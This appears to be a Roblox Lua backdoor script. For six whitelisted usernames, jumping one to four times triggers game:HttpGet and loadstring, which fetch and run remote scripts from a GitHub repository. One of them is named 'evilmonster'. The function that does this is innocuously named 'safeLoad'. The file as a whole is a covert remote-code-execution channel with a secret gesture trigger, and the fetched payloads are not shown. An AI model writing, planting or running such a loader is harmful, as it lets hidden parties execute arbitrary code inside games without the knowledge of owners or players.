local Players = game:GetService("Players")

local allowed = {
	["project_2kit"] = true,
	["bakonbits54"] = true,
	["sharksinthewater"] = true,
	["theonerulerofgravity"] = true,
	["koolguy1234513"] = true, 
	["animatedupload"] = true
}

local function safeLoad(url)
	local source = game:HttpGet(url)
	local func = loadstring(source)
	if func then
		func()
	end
end

local function runCommand(count)
	if count == 1 then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/shy%20guy")
	elseif count == 2 then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/sand")
	elseif count == 3 then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test")
	elseif count == 4 then
		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/evilmonster")
	end
end

local function setupCharacter(plr, char)
	local humanoid = char:WaitForChild("Humanoid")

	local jumpCount = 0
	local timer = 0
	local running = false
	local activeId = 0 -- prevents overlapping timers

	local function startTimer()
		if running then return end
		running = true
		activeId += 1
		local thisId = activeId

		task.spawn(function()
			while timer > 0 and thisId == activeId do
				task.wait(1)
				timer -= 1
			end

			-- If another timer replaced this one, ignore
			if thisId ~= activeId then return end

			local finalCount = jumpCount

			-- Reset BEFORE running command (important)
			jumpCount = 0
			timer = 0
			running = false

			if finalCount >= 1 and finalCount <= 4 then
				runCommand(finalCount)
			end
		end)
	end

	humanoid.StateChanged:Connect(function(_, newState)
		if newState == Enum.HumanoidStateType.Jumping then
			jumpCount += 1

			-- Too many jumps → hard reset
			if jumpCount > 4 then
				jumpCount = 0
				timer = 0
				running = false
				activeId += 1 -- cancel any running timer
				return
			end

			timer += 3
			startTimer()
		end
	end)
end

local function hookPlayer(plr)
	if not allowed[string.lower(plr.Name)] then
		return
	end

	plr.CharacterAdded:Connect(function(char)
		setupCharacter(plr, char)
	end)

	if plr.Character then
		setupCharacter(plr, plr.Character)
	end
end

-- Hook existing players
for _, plr in ipairs(Players:GetPlayers()) do
	hookPlayer(plr)
end

-- Hook new players
Players.PlayerAdded:Connect(hookPlayer)
